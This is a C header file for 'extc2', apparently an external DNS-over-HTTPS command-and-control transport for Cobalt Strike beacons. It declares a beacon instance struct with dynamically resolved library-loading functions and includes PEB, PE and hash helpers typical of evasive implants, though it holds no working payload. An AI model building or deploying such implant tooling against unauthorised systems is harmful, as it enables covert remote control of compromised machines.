/*-
 *
 * extc2: open source dns over http(s)
 * transport for cs. does not use the
 * smb beacon.
 *
-*/

#pragma once

#include <windows.h>
#include <ntstatus.h>

#include "macros.h"
#include "beacon.h"
#include "hashes.h"

typedef struct
{
	ULONG Id;
	
	struct
	{
		FUNC( FreeLibrary );
		FUNC( LoadLibraryA );
	} api;

	HMODULE Module[ 3 ];
} BEACON_INSTANCE, *PBEACON_INSTANCE;

#include "setting.h"
#include "tebpeb.h"
#include "hash.h"
#include "peb.h"
#include "pe.h"
